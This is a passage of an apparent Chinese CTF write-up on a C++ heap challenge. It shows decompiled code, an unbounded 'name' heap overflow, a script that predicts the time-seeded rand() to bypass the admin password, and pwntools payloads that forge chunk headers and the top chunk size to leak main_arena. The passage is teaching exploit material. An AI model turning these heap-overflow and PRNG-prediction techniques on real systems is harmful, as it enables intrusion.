<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=efcddcc85d4f186d9f52eb73565b577adb87609f, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>代码分析</strong></p>
<p>先说简单的 <code>upload</code> 和 <code>download</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">upload</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// r12</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = get_offset8(a1);                         <span class="comment">// a = *(b+8)</span></span><br><span class="line">  v2 = get_offset0(a1);                         <span class="comment">// a = *b</span></span><br><span class="line">  v3 = get_offset8(vector_state);               <span class="comment">// a = *(b+8)</span></span><br><span class="line">  become3(v5, &amp;v3);                             <span class="comment">// *a = *b</span></span><br><span class="line">  change_vector(vector_state, v5[<span class="number">0</span>], v2, v1);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Upload successfully!&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前面这几个函数的底层逻辑都写上去了（IDA 对于 cpp 的分析结果很差）</li>
<li>upload：的作用就是把 vector_state 管理的 vector 加上现在程序管理的 vector </li>
<li>download：的作用就是把 vector_state 管理的 vector 加到程序管理的 vector 中</li>
</ul>
<p>申请模块 <code>add</code> 中使用了 vector 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">add</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 a2[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_2458(a2);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++chunk_num;</span><br><span class="line">    sub_256A(a1, a2);</span><br><span class="line">    input_name_scores(a1);                      <span class="comment">// 分别输入&#x27;name&#x27;和&#x27;score&#x27;</span></span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter 1 to add another, enter the other to return&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( input() == <span class="number">1</span> );                       <span class="comment">// 输入&#x27;1&#x27;则循环</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">input_name_scores</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 name; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 score; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *chunk; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  name = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter the ctfer&#x27;s name:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(name, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v2 = sub_24D4(a1, chunk_num - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v2);<span class="comment">// 输入&#x27;name&#x27;</span></span><br><span class="line">  score = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter the ctfer&#x27;s scores&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(score, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  chunk = sub_24D4(a1, chunk_num - <span class="number">1</span>);</span><br><span class="line">  chunk[<span class="number">3</span>] = input();                           <span class="comment">// 输入&#x27;score&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>直接看 cpp 的反编译有点难看，于是我们直接进行调试：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">16</span>,<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/64bx <span class="number">0x55e5076c4ea0</span>+<span class="number">16</span></span><br><span class="line"><span class="number">0x55e5076c4eb0</span>:	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span></span><br><span class="line"><span class="number">0x55e5076c4eb8</span>:	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x64</span>	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span></span><br></pre></td></tr></table></figure>
<ul>
<li>输入 “name” 时没有限制长度，可以无限溢出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter the new name:&quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(name, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v10 = sub_24D4(a1, index);</span><br><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v10);</span><br><span class="line">score = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter the new score:&quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(score, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">chunk = sub_24D4(a1, index);</span><br><span class="line">chunk[<span class="number">3</span>] = input();</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>edit</code> 中输入 “name” 时也有同样的漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>要想进入菜单，需要先通过一个加密算法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">19</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = j | key[j] ^ <span class="number">0xF</span>;</span><br><span class="line">  code[j] = rand() &amp; v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个算法需要随机数，种子是从系统时间中获取的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seed = time(<span class="number">0LL</span>);</span><br><span class="line">srand(seed);</span><br></pre></td></tr></table></figure>
<ul>
<li>一般这种从系统时间中获取的随机数，都可以通过以下脚本破解：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>C语言中，time 这里的种子是秒级的，那么我们可以在写 exp 的时候也同时启动一个 time 的种子，获取同样的随机数</li>
<li>绕过脚本如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">libcc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">v0 = libcc.time(<span class="number">0</span>)</span><br><span class="line">libcc.srand(v0)</span><br><span class="line">key = <span class="string">&quot;n0_One_kn0w5_th15_passwd&quot;</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    v1 = i | <span class="built_in">ord</span>(key[i]) ^ <span class="number">0xF</span></span><br><span class="line">    password += <span class="built_in">chr</span>(libcc.rand() &amp; v1)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Password for admin:&quot;</span>, password)</span><br></pre></td></tr></table></figure>
<p>有堆溢出，但程序的堆分配很奇怪，直接分析反汇编有点困难，所以我们直接输出测试数据找规律</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">upload()</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">add(<span class="string">&quot;4&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">download()</span><br><span class="line">add(<span class="string">&quot;5&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">add(<span class="string">&quot;6&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223ea0</span></span><br><span class="line"><span class="function">Size: 0x21</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223ec0</span></span><br><span class="line"><span class="function">Size: 0x31</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223ef0 <span class="comment">/* upload */</span></span></span><br><span class="line"><span class="function">Size: 0x31</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223f20</span></span><br><span class="line"><span class="function">Size: 0x51</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223f70 </span></span><br><span class="line"><span class="function">Size: 0x91</span></span><br></pre></td></tr></table></figure>
<ul>
<li>堆只能从小到大进行申请，大小依次为“0x20”，“0x30”，“0x50”，“0x90”，“0x100”……</li>
<li>当一个 chunk 写满后，程序就会把原来的 chunk 释放，申请一个更大的 chunk，并把之前所有的数据复制进新的 chunk 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x564bdd223f70</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x564bdd223f70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x564bdd223f78</span> ◂— <span class="number">0x91</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x564bdd223f80</span> ◂— <span class="string">&#x27;111111111111d&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x564bdd223f88</span> ◂— <span class="number">0x6431313131</span> <span class="comment">/* &#x27;1111d&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x564bdd223f90</span> ◂— <span class="string">&#x27;222222222222d&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x564bdd223f98</span> ◂— <span class="number">0x6432323232</span> <span class="comment">/* &#x27;2222d&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x564bdd223fa0</span> ◂— <span class="string">&#x27;333333333333d&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x564bdd223fa8</span> ◂— <span class="number">0x6433333333</span> <span class="comment">/* &#x27;3333d&#x27; */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x564bdd223fb0</span> ◂— <span class="string">&#x27;444444444444d&#x27;</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x564bdd223fb8</span> ◂— <span class="number">0x6434343434</span> <span class="comment">/* &#x27;4444d&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x564bdd223fc0</span> ◂— <span class="string">&#x27;111111111111d&#x27;</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x564bdd223fc8</span> ◂— <span class="number">0x6431313131</span> <span class="comment">/* &#x27;1111d&#x27; */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x564bdd223fd0</span> ◂— <span class="string">&#x27;222222222222d&#x27;</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x564bdd223fd8</span> ◂— <span class="number">0x6432323232</span> <span class="comment">/* &#x27;2222d&#x27; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x564bdd223fe0</span> ◂— <span class="string">&#x27;555555555555d&#x27;</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x564bdd223fe8</span> ◂— <span class="number">0x6435353535</span> <span class="comment">/* &#x27;5555d&#x27; */</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x564bdd223ff0</span> ◂— <span class="string">&#x27;666666666666d&#x27;</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x564bdd223ff8</span> ◂— <span class="number">0x6436363636</span> <span class="comment">/* &#x27;6666d&#x27; */</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x564bdd224000</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>upload</code> 会保存当前数组的“状态”，并单独写入一个 chunk 中</li>
<li><code>download</code> 会把 <code>upload</code> 保存的 chunk 添加到当前数组的末尾，再写入堆中（如果写不下就新创建一个更大的 chunk，并把原来的 chunk 释放掉）</li>
</ul>
<p>现在了解该程序的分配规则了，首先要解决的就是堆风水的问题，限制如下：</p>
<ul>
<li>堆排列从小到大，并且不能重复申请</li>
<li>只能释放前面的 chunk，修改不了 free chunk</li>
<li>输入“score”会截断“name”，可能会破坏我们的 payload</li>
</ul>
<p>程序唯一的突破点就是 <code>upload</code>，因为它可以在可控 chunk 的后面格外写一个 chunk，这样就可以利用 <code>edit</code> 的堆溢出伪造 chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">12</span>, <span class="number">100</span>)</span><br><span class="line">upload()</span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;b&quot;</span> * <span class="number">0x8</span> + p64(<span class="number">0x501</span>)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x11e1</span>)</span><br><span class="line">payload += <span class="number">0x4d0</span> * <span class="string">&quot;\x00&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload,-<span class="number">1</span>)</span><br><span class="line">upload() <span class="comment"># 为了释放之前位置的upload chunk</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55ad43b41ec0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55ad43b41ec0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>) <span class="comment">/* upload chunk */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55ad43b41ec8</span> ◂— <span class="number">0x501</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55ad43b41ed0</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0018</span>│  <span class="number">0x55ad43b41ed8</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0020</span>│  <span class="number">0x55ad43b41ee0</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>) <span class="comment">/* top chunk */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55ad43b41ee8</span> ◂— <span class="number">0x11e1</span> <span class="comment">/* top chunk-&gt;size */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55ad43b41ef0</span> ◂— <span class="number">0x0</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55ad43b41ef8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>upload</code> 执行以后，程序会释放原来的 <code>upload chunk</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55ad43b41ec0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55ad43b41ec0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>) <span class="comment">/* upload chunk */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55ad43b41ec8</span> ◂— <span class="number">0x501</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55ad43b41ed0</span> —▸ <span class="number">0x7f3c1e436be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x55ad43b41f10</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55ad43b41ed8</span> —▸ <span class="number">0x7f3c1e436be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x55ad43b41f10</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55ad43b41ee0</span> ◂— <span class="number">0x0</span> <span class="comment">/* top chunk */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55ad43b41ee8</span> ◂— <span class="number">0x0</span> <span class="comment">/* top chunk-&gt;size */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55ad43b41ef0</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55ad43b41ef8</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55ad43b41f00</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55ad43b41f08</span> ◂— <span class="number">0xffffffff61616161</span></span><br></pre></td></tr></table></figure>
<p>现在 unsorted bin 有了，程序会优先从 unsorted bin 中分配 chunk，现在需要考虑的问题是怎么泄露 main_arena</p>
<ul>
<li>程序的泄露点在 <code>edit</code> 中：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Info before editing:\n&quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Index\tName\tScores\n&quot;</span>);</span><br><span class="line">v1 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)index);</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>edit_by_index</code> 找到目标后，会把其 “name” 和 “scores” 打印出来</li>
</ul>
<p>于是又要构建堆风水，想办法把 main_arena/heap 放到 “name” 或者 “scores” 中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">download()</span><br><span class="line">payload = <span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload,-<span class="number">1</span>)</span><br><span class="line">upload()</span><br></pre></td></tr></table></figure>
